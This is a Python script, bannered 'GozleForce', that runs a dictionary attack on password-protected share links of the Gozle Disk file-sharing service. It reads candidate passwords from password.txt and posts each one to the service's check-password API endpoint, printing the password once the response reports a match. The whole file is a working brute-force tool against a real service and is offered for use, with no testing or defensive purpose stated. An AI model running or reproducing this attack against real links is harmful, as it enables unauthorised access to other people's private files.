import requests,random,re,os,time

st = '{"matches":true,"status":"success"}'
link = 'https://disk.gozle.com.tm/api/v1/shareable-links/gNoIaAKNWPn5QS6vED7xN4knY9oC9z/check-password'

banner = """
                                                                                            
  _|_|_|                      _|            _|_|_|_|                                        
_|          _|_|    _|_|_|_|  _|    _|_|    _|        _|_|    _|  _|_|    _|_|_|    _|_|    
_|  _|_|  _|    _|      _|    _|  _|_|_|_|  _|_|_|  _|    _|  _|_|      _|        _|_|_|_|  
_|    _|  _|    _|    _|      _|  _|        _|      _|    _|  _|        _|        _|        
  _|_|_|    _|_|    _|_|_|_|  _|    _|_|_|  _|        _|_|    _|          _|_|_|    _|_|_|  
                                                                                             """
                                                

print(banner)
if not os.path.exists('password.txt'):
    print("The file password.txt (dictionary) was not found. Please transfer your dictionary and rename it")
    input("Press enter")
    exit()

link = input("Input your gozle disk link: ")

match = re.search(r'/s/(\w+)', link)
if match:
    identifier = match.group(1)
    new_url = f"https://disk.gozle.com.tm/api/v1/shareable-links/{identifier}/check-password"
        



while True:
    with open('password.txt', 'r') as file:
        for line in file.readlines():
            password = line.strip()

        
            data = {
    'password': password,
    'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76"
    }
            try:
                res = requests.post(new_url, data=data)
                if res.text == st:
                    print("Password is", password)
                    time.sleep(3343333)
                else:
                    print('Wrong pass', password)
            except requests.RequestException as e:
                print("An error occurred:", e)
